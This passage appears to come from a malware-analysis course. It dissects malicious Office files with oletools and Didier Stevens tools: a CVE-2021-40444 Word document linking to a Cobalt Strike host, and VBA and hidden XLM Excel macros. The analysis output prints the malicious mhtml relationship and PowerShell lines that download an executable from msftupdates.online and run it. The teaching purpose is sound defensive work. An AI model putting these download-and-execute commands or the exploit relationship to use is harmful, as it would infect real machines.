The sample is named `App description.docx` with the MD5 hash as `6f194654557e1b52fb0d573a5403e4b1`. This document contains an anomalous `oleObject relationship` in the document targeting an `external` malicious HTML resource with an MHTML handler, leading to the abuse of this vulnerability.

As per Microsoft, " _Content that is downloaded from an external source is tagged by the Windows operating system with a mark of the web, indicating it was downloaded from a potentially untrusted source. This invokes Protected Mode in Microsoft Office, requiring user interaction to disable it to run content such as macros. However, in this instance, when opened without a mark of the web present, the document’s payload executed immediately without user interaction – indicating the abuse of a vulnerability._"

This vulnerability only requires users to open a document, and no further interactions are necessary. There is no need to click on any 'Enable Content' button, as is the case with VBA macro-enabled documents. Besides an Office document, this vulnerability can affect other applications such as Skype, Microsoft Outlook, Visual Studio, etc., that use the MSHTML engine under their hood.

We'll perform the analysis of a malicious document file. The details related to the sample are as follows:

| Name | Description |
| --- | --- |
| File Name | App description.docx |
| MD5 Hash | 6f194654557e1b52fb0d573a5403e4b1 |
| Detections | [VirusTotal](https://www.virustotal.com/gui/file/3bddb2e1a85a9e06b9f9021ad301fdcde33e197225ae1676b8c6d0b416193ecf) |

The screenshot below shows the content of the document seeking application developers:

![office-analysis](2YdfIRHDsNsL.png)

* * *

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **oleid**: `C:\Tools\MalDoc\Office\Tools\oletools\oleid.py`
- **oleobj**: `C:\Tools\MalDoc\Office\Tools\oletools\oleobj.py`
- **zipdump.py**: `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\zipdump.py`
- **re-search.py**: `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\re-search.py`
- **xmldump.py** : `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\xmldump.py`
- **Cobalt Strike Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx`

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

Let's begin our analysis by examining the `App-description.docx` document and scrutinizing the output from `oleid.py`.

```cmd-session

C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oleid.py C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx

```

The analysis with `oleid` showcases the presence of external relations in the document.

![office-analysis](ntu9gNuBvd72.png)

As suggested in the above output in the screenshot, we can use `oleobj` to obtain the external relationship directly as shown below:

```cmd-session

C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oleobj.py C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx

oleobj 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

-------------------------------------------------------------------------------
File: 'C:\\Tools\\MalDoc\\Office\\Demo\\Samples\\Cobalt-Strike\\App-description.docx'
Found relationship 'oleObject' with external link mhtml:http://pawevi.com/e32c8df2cf6b7a16/specify.html!x-usc:http://pawevi.com/e32c8df2cf6b7a16/specify.html
Potential exploit for CVE-2021-40444

```

It is really good to get the external relationship and details of the `suspicious URL` directly in no time by using `oleobj.py`. However, we should also be aware of the whole process, such as where the relationship is stored and how to extract it using some more useful tools and scripts.

If you use multiple [DidierStevensSuite](https://blog.didierstevens.com/didier-stevens-suite/) tools together, it is recommended to change directory to the path where all tools are placed. For example, we can change the current directory to the following location in target (VM):

```cmd-session

C:\> cd C:\Tools\MalDoc\Office\Tools\DidierStevensSuite

```

This is because we want to use multiple tools together from DidierStevensSuite, so it would be better not to type the path everytime. The analysis can be started using the Zipdump Python utility. This will provide us overview of file contents.

```cmd-session

C:\Tools\MalDoc\Office\Tools\DidierStevensSuite> python zipdump.py C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx

Index Filename                     Encrypted Timestamp
    1 [Content_Types].xml                  0 1980-01-01 00:00:00
    2 _rels/                               0 2021-08-19 13:19:48
    3 _rels/.rels                          0 1980-01-01 00:00:00
    4 docProps/                            0 2021-08-19 13:19:48
    5 docProps/app.xml                     0 1980-01-01 00:00:00
    6 docProps/core.xml                    0 1980-01-01 00:00:00
    7 word/                                0 2021-08-19 13:19:48
    8 word/document.xml                    0 2021-08-19 13:19:48
    9 word/fontTable.xml                   0 1980-01-01 00:00:00
   10 word/webSettings.xml                 0 1980-01-01 00:00:00
   11 word/styles.xml                      0 1980-01-01 00:00:00
   12 word/settings.xml                    0 1980-01-01 00:00:00
   13 word/theme/                          0 2021-08-19 13:19:48
   14 word/theme/theme1.xml                0 1980-01-01 00:00:00
   15 word/media/                          0 2021-08-19 13:19:48
   16 word/media/image1.wmf                0 1980-01-01 00:00:00
   17 word/_rels/                          0 2021-08-19 13:19:48
   18 word/_rels/document.xml.rels         0 2021-08-19 13:19:48

```

Zipdump has an option to dump all content of the file using the `--dumpall` parameter. This is really important as we can search through it.

```cmd-session

C:\Tools\MalDoc\Office\Tools\DidierStevensSuite> python zipdump.py C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx --dumpall

```

![office-analysis](DWyRSBBO3zy2.png)

We can see a lot of information from the content. Next, we need to find a way to search for some patterns in the dumped content. To do that, we will use the next interesting script, `re-search.py`. This script uses regular expressions to search through files. We can use regular expressions from a small built-in library or provide our own regular expressions. The regex argument is the name of a library regex.

For example, the `url*` library contains regular expression as shown below:

`url*: [a-zA-Z]+://[_-a-zA-Z0-9.]+(?:/[-a-zA-Z0-9+&@#/%=~_|!:,.;]*)?(?:\?[-a-zA-Z0-9+&@#/%=~_|!:,.;]*)?`

We'll check the help section of the `re-search.py` Python script using the `--help` parameter:

![office-analysis](2GwHoubOUtTL.png)

The good thing is that we can run these regex searches using `re-search.py` directly on the zip dump's output. To do that, we just need to append ` | re-search.py --name url` to the previous command, i.e., zipdump with `--dumpall`. The pipe `|` will redirect the output of previous command as the input to `re-search.py`.

```cmd-session

C:\Tools\MalDoc\Office\Tools\DidierStevensSuite> python zipdump.py C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx --dumpall | python re-search.py --name url

http://schemas.openxmlformats.org/package/2006/content-types
http://schemas.openxmlformats.org/package/2006/relationships
http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties
http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties
http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument
http://schemas.openxmlformats.org/officeDocument/2006/extended-properties
http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes
http://schemas.openxmlformats.org/package/2006/metadata/core-properties
http://purl.org/dc/elements/1.1/
http://purl.org/dc/terms/
http://purl.org/dc/dcmitype/
http://www.w3.org/2001/XMLSchema-instance
http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas
http://schemas.microsoft.com/office/drawing/2014/chartex
http://schemas.microsoft.com/office/drawing/2015/9/8/chartex

...SNIP...

http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings
http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles
http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable
http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject
http://pawevi.com/e32c8df2cf6b7a16/specify.html!x-usc:http://pawevi.com/e32c8df2cf6b7a16/specify.html
http://schemas.openxmlformats.org/officeDocument/2006/relationships/image

```

At the end of the output, there's a match for an external URL that is suspicious.

![office-analysis](nr17LKEhODGX.png)

We can also perform a [Yara](https://yara.readthedocs.io/en/latest/) search in the whole document. YARA, which stands for "Yet Another Recursive Acronym," is an open-source pattern-matching Swiss army knife that identifies patterns within files, making it a powerful tool for malware detection. HackTheBox Academy has a [module](https://academy.hackthebox.com/module/details/234) focussed on Yara rules.

Zipdump supports the functionality to perform searches using YARA rules with files, directories, and direct strings as well. We'll use the YARA string search option to search for this domain using `--yara "#s#pawevi.com"`. This should tell us which file contains this suspicious string.

```cmd-session

C:\Tools\MalDoc\Office\Tools\DidierStevensSuite> python zipdump.py --yara "#s#pawevi.com" C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx

```

![office-analysis](amsCs5xW7Xpd.png)

The output shows that this string is present in the relationships file with index 18. Let's open this index 18 relationship file using `--select 18` along with the `--dumpall` or `-d` option to show the dump file content.

```cmd-session

C:\Tools\MalDoc\Office\Tools\DidierStevensSuite> python zipdump.py --select 18 --dumpall C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://pawevi.com/e32c8df2cf6b7a16/specify.html!x-usc:http://pawevi.com/e32c8df2cf6b7a16/specify.html" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.wmf"/></Relationships>

```

This output can be enhanced by appending the option ` | xmldump.py pretty` to the previous command.

```cmd-session

C:\Tools\MalDoc\Office\Tools\DidierStevensSuite> python zipdump.py --select 18 --dumpall C:\Tools\MalDoc\Office\Demo\Samples\Cobalt-Strike\App-description.docx | python xmldump.py pretty

```

![office-analysis](jjrxCB5iWYmR.png)

As we can see there is an external relationship containing MHTML and external keywords.

This domain is known to host a Cobalt Strike infrastructure.

![office-analysis](bWvrRTm8ewJX.png)

This is our IOC, which we extracted from this Office file. This domain address and files were taken down at the time of analysis of this sample.

* * *


# Malicious Excel Macro Analysis

# Introduction

Adversaries often utilize a range of methods to exploit vulnerabilities and breach systems. One notable technique involves using Excel 4.0 macros to perform malicious actions as soon as a document is opened. This section offers an in-depth examination of a malicious Office document, highlighting the strategies employed by attackers and the countermeasures to defend against such threats.

[Microsoft Excel](https://en.wikipedia.org/wiki/Microsoft_Excel) is a spreadsheet editor developed by Microsoft. It features calculation or computation capabilities, graphing tools, pivot tables, and a **macro programming language** called Visual Basic for Applications (VBA). Excel forms part of the Microsoft 365 suite of software. Using this, adversaries can perform different calculations to obfuscate code, call windows APIs, access and download additional malicious code from remote servers, launch existing programs on the system and so on.

## History of Macro programming

As per [Wikipedia](https://en.wikipedia.org/wiki/Microsoft_Excel), Excel supported end-user programming of macros (automation of repetitive tasks) and user-defined functions (extension of Excel's built-in function library) from its first version. In early versions of Excel, these programs were written in a macro language whose statements had formula syntax and resided in the cells of special-purpose macro sheets, stored with the file extension `.XLM` in Windows. XLM was the default macro language for Excel through Excel 4.0. Beginning with version 5.0, Excel recorded macros in VBA by default. All versions of Excel, including Excel 2021, are capable of running an XLM macro, though Microsoft discourages their use.

## VBA vs XLM Macros

In the previous sections, we have already seen the abuse of macros to gain code execution on the target system. Interestingly, those macros are VBA-based. Hence, when we extract the contents of, say, a Word file, we will see a dedicated directory for the VBA macro project used inside the document. Excel is an exception when it comes to macros.

Excel has mainly two types of macros:

- `Excel 5.0 Macros`
- `Excel 4.0 Macros`

The user has the option to choose either one of these macro standards. The Excel 5.0 macro is the latest technology based on VBA, whereas the Excel 4.0 macro is a legacy technology, famously called XLM macros. Attackers prefer to use XLM macros instead of VBA-based macros to evade security solutions. One interesting point to note is that XLM macros are stored in OLE streams, contrary to their VBA counterparts, which are stored in a separate directory.

### Excel 5.0 Macros (VBA)

Excel VBA Macros are similar to the ones we saw in the previous sections in the Microsoft Office Word document. VBA Macros are added inside an Excel file using Visual Basic for Applications. The screenshot below shows an Excel file that doesn't have any hidden sheets or hidden text. In MS Excel, the VBA code can be viewed by pressing `Alt+F11` or from the View tab (i.e. `View > Macro > View Macros`). This opens up the Microsoft Visual Basic for Applications window, showing the excel objects that include the macro code. The screenshot below shows this:

![Excel-VBA](O6xI944HryJ4.png)

These Excel 5.0 Macro-enabled files can be analyzed in the same way discussed in the previous sections (Malicious Word Macro Analysis) by using tools like `oleid`, `olevba`, etc.

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **olevba**: `c:\tools\maldoc\office\tools\oletools\olevba.py`
- **oledump**: `c:\Tools\MalDoc\Office\Tools\oletools\oledump\oledump.py`
- **AMSIScriptContentRetrieval**: `C:\Tools\AMSIScript\AMSIScriptContentRetrieval.ps1`
- **VBA Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\VBA\update-kb.xlsm`
- **XLM Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\Urgent-patch-ALL.xls`
- **XLMDeobfuscator**: `XLMDeobfuscator` is added in environmental variables. In command prompt, simply type `XLMDeobfuscator` and provide file path with `--file` parameter.

* * *

**Warning:** These malicious samples should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

To get the details of the VBA macro code, we can use `olevba.py`.

![Excel-VBA](loYotIWOGBOe.png)

In the same output, we can find a table with more details about suspicious items in the VBA macro code:

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\olevba.py C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\VBA\update-kb.xlsm

...SNIP...

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|ADODB.Stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|PowerShell          |May run PowerShell commands                  |
|Suspicious|ExecutionPolicy     |May run PowerShell commands                  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|{REDACTED}          |May run an executable file or a system       |
|          |                    |command using PowerShell                     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Microsoft.XMLHTTP   |May download files from the Internet         |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.msftupdat|URL                                          |
|          |es.online/KB2919355.|                                             |
|          |exe                 |                                             |
|IOC       |KB2919355.exe       |Executable file name                         |
|IOC       |svchost.exe         |Executable file name                         |
|IOC       |cmd.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

```

This way, we can extract the IOCs in the case of VBA macro-enabled Excel files. We'll now go through another type of macro file, which is the `Excel 4.0 (XLM Macro)`.

### Excel 4.0 Macros (XLM)

In these kinds of files, we don't see any macros if we press `Alt+F11`, which is the keyboard shortcut used to open the Microsoft Visual Basic for Applications (VBA) in Microsoft Excel.

![Excel-XLM](S3J2EP29jHmw.png)

So the question is how is the malicious code inserted in these files?

**The answer is Excel 4.0 Macro.**

When attackers create an excel file, they insert an MS Excel 4.0 macro sheet in the workbook.

![Excel-XLM](GFWBgL2xPKI7.png)

These sheets are often hidden in this kind of files.

![Excel-XLM](Hr7XCl79vtDU.png)

Formulas are often in white text color on a white background. This makes them hidden from the eyes of the end user or analyst. However, they are still visible programmatically, such as by using tools like `olevba`, etc.

![Excel-XLM](reae8cwbrqOX.png)

In this section, we will analyze an XLM-based infected Excel file and discuss it in detail. First, we'll discuss the internal structure of Excel files.

## Internal Structure of Excel Files

Excel files, particularly those saved in the `.xls` or `.xlsx` format, are complex structures composed of various components:

- `Worksheets`: These are the primary containers for data within an Excel file. Each worksheet is a grid of cells, which can contain text, numbers, or formulas.
- `Macros`: Macros are scripts embedded within Excel files, written in Visual Basic for Applications (VBA) or using Excel 4.0 Macro Language. They can automate repetitive tasks but can also be exploited for malicious purposes.
- `Workbook`: This is the overall container for one or more worksheets and associated data, such as macros, charts, and other elements.
- `Cells`: The fundamental unit of data storage in a worksheet, cells can hold various types of data, including numbers, text, and formulas.
- `OLE Objects`: Excel files can also contain embedded objects such as images, charts, and other documents through Object Linking and Embedding (OLE) technology.

## Primer On XML SpreadSheets

The latest specification for Excel files is structured using XML, which means we need to parse the XML files within the spreadsheet package to analyze embedded Excel 4.0 macros or APIs. In particular, each Excel workbook is represented by specific XML files, with the core document named `workbook.xml`. This file is crucial because it defines the structure of the workbook, including information about each individual sheet.

Upon extracting the contents of an `.xlsx` file, `workbook.xml` can be located and inspected. This document contains `<sheet>` tags, which are essential for analysis, as they indicate the number and organization of sheets within the workbook. By examining these tags, we can determine the total number of sheets present and any attributes set for each one.

Adversaries often exploit this structure to hide malicious content in hidden sheets within a workbook. We can easily identify such hidden sheets by looking at attributes set in the `<sheet>` tag, such as the `state` attribute. If the `state` is hidden, then the sheet will not be visible to the user.

```xml
<workbook . . .>
. . .
    <sheets>
    <sheet name="sheet1" sheetId="1" r:id="rId1">
    <sheet name="sheet2" sheetId="2" r:id="rId2">
    <sheet name="Offer" sheetId="3" state="hidden" r:id="rId3">
    </sheets>
. . .
</workbook>

```

## Attack Vectors Using Excel Macros

- `VBA Macros`: Visual Basic for Applications (VBA) is a powerful scripting language integrated into Excel. While intended to automate tasks, VBA macros can be crafted to execute malicious code when a document is opened or certain events are triggered.
- `Excel 4.0 Macros`: Before VBA, Excel 4.0 macros were used for automation. Despite being outdated, these macros can still be executed in modern Excel versions, making them a viable attack vector.
- `Auto-Open Functions`: Attackers often use special functions to ensure their malicious code runs automatically when the document is opened. For Excel 4.0 macros, renaming a cell to "auto\_open" will trigger the macro upon opening the file.

## Tools

`XLMMacroDeobfuscator` can be used to decode obfuscated XLM macros (also known as Excel 4.0 macros). It utilizes an internal XLM emulator to interpret the macros, without fully executing the code.

To install the latest development of `XLMMacroDeobfuscator`, we can use the command below:

```python
pip install -U https://github.com/DissectMalware/XLMMacroDeobfuscator/archive/master.zip --force

```

This is already present on the target (VM). `XLMDeobfuscator` is added in the environmental variables. In command prompt, simply type `XLMDeobfuscator` and provide file path with the `--file` parameter. We'll use it later in this section.

* * *

## Auto-Open Functionality in Excel 4.0 Macros

Attackers use specific techniques to ensure their malicious VBA macros execute when a document is opened. One such technique involves changing a cell name to 'auto\_open.' This cell name acts as a trigger, instructing Excel to execute the macro as soon as the document is loaded.

Let's see how this works:

- `Document Opening`: When the victim opens the Excel document, Excel scans for any macros associated with the workbook.
- `Auto_Open Trigger`: If a cell is named `auto_open`, Excel automatically runs the macro code contained in that cell.
- `Malicious Actions`: The macro can perform a variety of malicious actions, such as downloading and executing additional malware, stealing data, or altering system settings.

## Analysis of XLM Macro

We have this Excel file (saved in `C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\Urgent-patch-ALL.xls`) which claims it can install all the latest patches on your system if the 'Enable Content' button is pressed. However, when you click on it, a message box pops up with the message 'update done.' On the network level, it contacted a suspicious URL to download an executable and executed it.

The GIF below demonstrates these capabilities of the Excel File:

![alt text](Z0LuuGzBq2B7.gif)

### Basic File information

Let's start with getting some basic information about the file type we are dealing with using `trid`:

```cmd-session
C:\> trid C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\Urgent-patch-ALL.xls

```

![Excel-XLM](c7rhAfBA87TE.png)

### Strings check

Next, we can run `strings` on the file:

```cmd-session
C:\> strings C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\Urgent-patch-ALL.xls | findstr /I "http url exe dll"

TdLl
RESDLL
UniresDLL
powershell.exe -Command "wget 'http://msftupdates.online/KB2919355.exe' -OutFile C:\Users\Public\KB2919355.exe"B
powershell.exe -Command "Start-Process C:\Users\Public\KB2919355.exe"B

```

Sometimes, search using `strings` can also provide some useful information. For example, the PowerShell related command in the above output can be revealed.

### OLEID

Let's check some basic information using the `OLEID`.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oleid.py c:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls

```

![Excel-XLM](LEmuLUr9jBqb.png)

The output shows that there are no VBA macros present, and it indicates the presence of XLM macros.

### OLEVBA

As shown in the output from OLEID, the file contains XLM macros and suggests using `olevba` to analyse them.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\olevba.py c:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls

```

![Excel-XLM](Pgcav7ZsIi1A.png)

The output of `olevba.py` shows the IOCs containing the suspicious domains hosting the malicious executable files.

### OLEDUMP BIFF Plugin

OLEDUMP provides a number of plugins and, in particular, the `plugin_biff` for inspecting the binary file format of Excel 97 - 2003 documents. BIFF stands for Binary Interchange File Format and this structure varies from the current VBA format used currently by office documents. This means that we'll need to use this plugin to identify potential Excel 4 macro use.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oledump\oledump.py c:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls -p plugin_biff

```

![Excel-XLM](KxSsJrYRP2aQ.png)

This plugins parses BIFF format in `.xls` files (e.g., Excel 4 macros) and provides lot of information. We need to filter the required information related to Excel 4 macros. To filter it, let's check the help menu for this plugin by entering `--pluginoptions -h`. It shows the arguments for this plugin.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oledump\oledump.py c:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls -p plugin_biff --pluginoptions -h

```

![Excel-XLM](5eRpdniHa3io.png)

As shown, the `-x` option will select all records relevant for Excel 4 macros:

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oledump\oledump.py c:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls -p plugin_biff --pluginoptions -x

```

![Excel-XLM](2HjdDLNeHrSq.png)

This shows us all records relevant to Excel 4.0 macros. We can also see the records that contains suspicious commands.

### Hidden sheets

Additionally, workbook sheets can be hidden or "very hidden," making them initially harder to detect. The `plugin_biff` can identify hidden sheets, while YARA signatures also help detect them. Furthermore, you can reveal these hidden sheets directly within Microsoft Office.

![Excel-XLM](hNTsVjDBNGwF.png)

From the UI of MS Excel, we can see the hidden sheet by doing a "Right click" on the sheets and selecting "Unhide".

![Excel-XLM](H8LsWuDpS4mj.png)

Select the hidden sheet, and click ok to unhide it.

![Excel-XLM](VpCrMFkRu7Qw.png)

### Hidden formulas

This is how the hidden sheet looks like - completely blank.

![Excel-XLM](HKPf0OE7PDfX.png)

But as per the output from the BIFF plugin, there are two formulas present.

![Excel-XLM](WJc6gsyFeia2.png)

Select all and change font color to something dark.

![Excel-XLM](wWeGx25LYdr5.png)

Formulas are visible now.

![Excel-XLM](ZzZBO0g5m62b.png)

This technique is often used by adversaries to hide formulas from the analyst's eyes. We will now use XLMMacroDeobfuscator to extract the XLM or Excel 4.0 macros.

```cmd-session
C:\>XLMDeobfuscator --file c:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls

```

![Excel-XLM](vV16q1HTndlN.png)

### AMSI Monitoring

AMSI can also be used to understand what malware is doing, apart from deobfuscating it manually. There's a downside to this, though, which is that it requires execution of the malware. A PowerShell [script](https://gist.github.com/mattifestation/e179218d88b5f100b0edecdec453d9be#file-amsiscriptcontentretrieval-ps1) (AMSIScriptContentRetrieval) is available to extract script contents using the AMSI ETW provider. We'll use this to demonstrate extracting script contents using the AMSI ETW provider.

First, we need to start an ETW trace for the provider `Microsoft-Antimalware-Scan-Interface`:

```powershell

logman start AMSITrace -p Microsoft-Antimalware-Scan-Interface Event1 -o AMSITrace.etl -ets

```

Execute the malicious macro or scripts after starting the trace, and they will be logged by AMSI. Then stop the trace by using below command:

```powershell

logman stop AMSITrace -ets

```

Then, we'll run the script to extract the deobfuscated content from AMSI:

```powershell

PS C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo> .\AMSIScriptContentRetrieval.ps1

Session         : 0
ScanStatus      : 0
ScanResult      : 1
AppName         : Excel
ContentName     : C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls
Content         : EXEC(powershell.exe -Command "wget 'http://msftupdates.online/KB2919355.exe' -OutFile
                  C:\Users\Public\KB2919355.exe");

Hash            : BC152F61DE7BA42EAA51BE2BF8B89E77DAF364212828E6FD384AAF3331FF0BB8
ContentFiltered : False

Session         : 0
ScanStatus      : 0
ScanResult      : 1
AppName         : Excel
ContentName     : C:\Tools\MalDoc\Office\Demo\Samples\Excel\Demo\urgent-patch-all.xls
Content         : EXEC(powershell.exe -Command "wget 'http://msftupdates.online/KB2919355.exe' -OutFile
                  C:\Users\Public\KB2919355.exe");
                  EXEC(powershell.exe -Command "Start-Process C:\Users\Public\KB2919355.exe");

Hash            : 0D446A113AC68FB7D629C440BC4B64E0BCFDB0477D9D4FE6DA14D4028F02DE3E
ContentFiltered : False

Session         : 1
ScanStatus      : 0
ScanResult      : 1
AppName         : PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.17763.1
ContentName     :
Content         : Start-Process C:\Users\Public\KB2919355.exe
Hash            : 51E849CE293918BA1B5ECA574A673F12D29819DFD71A2AE819218FB22275ACCC
ContentFiltered : False

Session         : 1
ScanStatus      : 0
ScanResult      : 1
AppName         : PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.17763.1
ContentName     :
Content         : wget 'http://msftupdates.online/KB2919355.exe' -OutFile C:\Users\Public\KB2919355.exe
Hash            : F05F0E5B4A18596B248897E9917C68D2918EAAFF1C94C86E2B84307E2DAF54A7
ContentFiltered : False

Session         : 2
ScanStatus      : 0
ScanResult      : 1
AppName         : PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.17763.1
ContentName     : C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Utility\Microsoft.PowerShell.
                  Utility.psd1
Content         : @{
                  GUID="1DA87E53-152B-403E-98DC-74D7B4D63D59"
                  Author="Microsoft Corporation"
                  CompanyName="Microsoft Corporation"
                  Copyright="© Microsoft Corporation. All rights reserved."
                  ModuleVersion="3.1.0.0"
                  PowerShellVersion = '5.1'
                  CLRVersion="4.0"
                  CmdletsToExport= "Format-List", "Format-Custom", "Format-Table", "Format-Wide",
                      "Out-File", "Out-Printer", "Out-String",
                      "Out-GridView", "Get-FormatData", "Export-FormatData", "ConvertFrom-Json", "ConvertTo-Json",
                      "Invoke-RestMethod", "Invoke-WebRequest", "Register-ObjectEvent", "Register-EngineEvent",
...SNIP...

Session         : 3
ScanStatus      : 0
ScanResult      : 1
AppName         : PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.17763.1
ContentName     :
Content         : { Set-StrictMode -Version 1; $_.OriginInfo }
Hash            : A04486704318BADEBBDD331562C6DAFEF3053B8FA602993E38A6DF0C66F015BE
ContentFiltered : False

Session         : 4
ScanStatus      : 0
ScanResult      : 1
AppName         : PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.17763.1
ContentName     :
Content         : $global:?
Hash            : FEB60DE98632D9F666E16E89BD1C99174801C761115D4A9F52F05EF41E397D2D
ContentFiltered : False

```

The output reveals the script content and commands executed through the macro. This sample wasn't obfuscated, but in the following sections, we'll examine a more complex, sophisticated example.


# Obfuscated Excel 4.0 Macro (XLM)

We'll perform the analysis of a malicious XLM sample. The details are provided below:

| Name | Description |
| --- | --- |
| File Name | Document\_19977131.xlsm |
| MD5 Hash | 6285BD5F439F13FBBEB3368F2D36A8AF |
| Malware family | LemonDuck |

Here's the link to [VirusTotal](https://www.virustotal.com/gui/file/f31d67acf9ea5121b7d77c85c1fa816604f26c82bb5c1eb5c527abf2d047c2e5/details) for this sample.

The screenshot below shows what the file looks like, displaying an image with instructions to click on 'Enable Content.' It contains a total of 3 sheets, i.e., `sheet`, `sheet1`, and `sheet2`. There are no hidden sheets.

![Excel-XLM](aHkl1yVdg7zj.png)

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **oleid**: `C:\Tools\MalDoc\Office\Tools\oletools\oleid.py`
- **olevba**: `c:\tools\maldoc\office\tools\oletools\olevba.py`
